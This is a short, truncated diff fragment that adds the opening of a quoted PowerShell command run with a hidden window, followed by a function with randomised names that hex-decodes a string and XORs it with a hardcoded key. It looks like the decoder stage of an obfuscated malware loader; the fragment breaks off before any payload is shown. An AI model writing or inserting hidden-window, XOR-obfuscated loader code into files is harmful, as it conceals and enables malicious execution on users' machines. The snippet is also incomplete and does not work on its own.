@@ -1,0 +1,2 @@
+"powershell -WindowStyle Hidden 
+function y171e {param($z4627)$k58be9='a57157c';$yce74a='';for ($i=0; $i -lt $z4627.length;$i+=2){$vc2775=[convert]::ToByte($z4627.Substring($i,2),16);$yce74a+=[char]($vc2775 -bxor $k58be9[($i/2)%$k58be9.length]);}return "
